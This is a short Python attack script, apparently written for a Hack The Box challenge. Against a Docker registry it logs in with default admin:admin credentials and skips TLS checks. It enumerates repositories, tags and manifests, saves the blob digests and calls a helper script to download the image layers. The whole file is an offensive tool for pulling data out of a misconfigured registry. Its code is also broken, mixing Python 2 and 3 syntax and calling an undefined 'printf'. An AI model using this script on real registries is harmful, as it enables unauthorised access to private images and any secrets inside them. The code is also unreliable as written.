#!/usr/bin/python
import requests
import re
import os
import time
import json
import sys
from requests.auth import HTTPBasicAuth
from urllib3.exceptions import InsecureRequestWarning
r=requests.session()
if len(sys.argv) < 2 :
  print("#"*51)
  print("Syntax:python blob_extractor.py <url>")
  print("Example:python blob_extractor.py https://docker.example.com/v2/")
  print("#"*51)
else :
 url=sys.argv[1]
 def stick():
  print("-"*50);
 requests.packages.urllib3.disable_warnings()
 stick()
 print("Coded by ZyperX")
 print("H T B : @ZyperX")
 print("clearing previous run...")
 os.system("rm -rf blobs.txt")
 stick()
 time.sleep(2)
 os.system("clear")
 stick()
 print("Enumerating Repo-list")
 stick()
 def visit(url):
  ops=r.get(url,auth=HTTPBasicAuth('admin','admin'),verify=False)
  return ops
 def grep(exp):
  op=re.search('\[\".*?\"',exp)
  op=str(op.group())
  op=op.replace('[','')
  op=op.replace('"','')
  return op
 rurl=url+"_catalog"
 op=visit(rurl)
 print(op.text)
 op=str(op.text)
 repo=grep(op)
 print("1."+repo)
 stick()
 print("Enumerating %s Repo for tags....")%(repo)
 stick()
 rurl=url+repo+"/tags/list"
 op=visit(rurl)
 print(op.text)
 op=re.search('\"tags\"\:\[\".*?\"',op.text)
 op=str(op.group())
 tags=grep(op)
 print("1."+tags)
 stick()
 print("Enumerating blobs in %s")%(tags)
 stick()
 rurl=url+repo+"/manifests/"+tags
 op=visit(rurl)
 op=re.findall('sha256\:.*?\"',op.text)
 print("Writing blobs to blobs.txt..")
 for i in op:
  i=i.replace('"','')
  f=open("blobs.txt",'a') 
  f.write(i+"\n")
  print i
 stick()
 print("Downloading blobs......")
 os.system("./downloader.sh")
 stick()
 printf("Happy hacking all") 
